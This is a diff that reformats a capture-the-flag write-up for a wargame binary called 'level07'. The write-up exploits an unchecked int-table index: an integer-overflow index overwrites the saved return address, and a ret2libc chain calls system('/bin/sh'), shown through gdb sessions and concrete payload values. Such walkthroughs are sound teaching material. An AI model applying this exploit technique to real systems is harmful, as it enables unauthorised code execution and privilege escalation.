@@ -1,3 +1,5 @@
+# Solution
+
 the program read and store data from a int table.
 
 the program do not check the bound of the table when we try to store or read
@@ -12,6 +14,7 @@ since we can store any data anywhere in the program lets overwrite eip
 
 we need to find start address of our table and eip address
 
+```sh
 (gdb) b *main+520
 Breakpoint 3 at 0x804892b
 (gdb) c
@@ -32,19 +35,21 @@ Stack level 0, frame at 0xffffd620:
   eip at 0xffffd61c
 
   Breakpoint 2, 0x080486dd in read_number ()
+
 (gdb) p $ebp+0x8
 $5 = (void *) 0xffffd430
+
 (gdb) x/x $ebp+0x8
 0xffffd430:	0xffffd454
 
-
-eip = 0xffffd61c  tab = 0xffffd454
-
->>> (0xffffd61c - 0xffffd454) / 4
-114
+# eip = 0xffffd61c  tab = 0xffffd454
+# >>> (0xffffd61c - 0xffffd454) / 4
+# 114
+```
 
 we can acces eip at tab[114] lets check
 
+```sh
 Continuing.
  Index: 114
  Number at data[114] is 4158936339
@@ -55,16 +60,17 @@ Continuing.
 
 x/x 0xffffd61c
 0xffffd61c:	0xf7e45513
-
-
+```
 but this index will be protecded so we need to overflow
 
 (UINT_MAX + 1) / 4 + 114 = 4294967296 / 4 + 114 = 1073741938
 
+```sh
 Continuing.
  Index: 1073741938
  Number at data[1073741938] is 4158936339
  Completed read command successfully
+```
 
 we now control eip lets return to a shell
 
@@ -74,6 +80,7 @@ but it will take to much time to build the shellcode 4 by 4 bytes and to calcula
 or we can build a shell with already stored value it's call ROP chain attack
 this program is linked with libc
 
+```sh
 (gdb) info proc mappings
 process 1933
 Mapped address spaces:
@@ -94,14 +101,17 @@ Mapped address spaces:
 	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
 	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
 	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+```
 
 we can find "/bin/sh" and "system" function string in the shared libc
 
+```sh
 (gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
 0xf7f897ec
 1 pattern found.
 (gdb) p system
 $7 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+```
 
 lets build our payloads:
 
@@ -111,6 +121,7 @@ tab[1073741938] = 4159090384
 eip+0x8 = /bin/sh
 tab[116] = 4160264172
 
+```sh
 level07@OverRide:~$ ./level07 
 ----------------------------------------------------
   Welcome to wil's crappy number storage service!   
@@ -133,5 +144,5 @@ Input command: store
  Completed store command successfully
 Input command: quit
 $ whoami
-\level08
-
+level08
+```
